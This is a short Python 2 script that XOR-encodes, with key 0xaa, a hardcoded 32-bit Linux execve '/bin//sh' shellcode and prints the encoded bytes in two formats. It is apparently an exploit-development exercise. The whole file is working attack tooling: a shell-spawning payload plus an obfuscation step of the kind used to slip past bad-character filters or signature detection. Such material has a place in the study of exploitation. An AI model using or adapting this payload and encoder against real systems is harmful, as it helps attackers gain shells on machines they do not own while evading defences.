

encoded=""
encoded2=""

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

for c in bytearray(shellcode):
	e = c ^ 0xaa
	encoded += "\\x"
	encoded += "%02x" % e

	encoded2 += ",0x"
	encoded2 += "%02x" % e

print encoded
print encoded2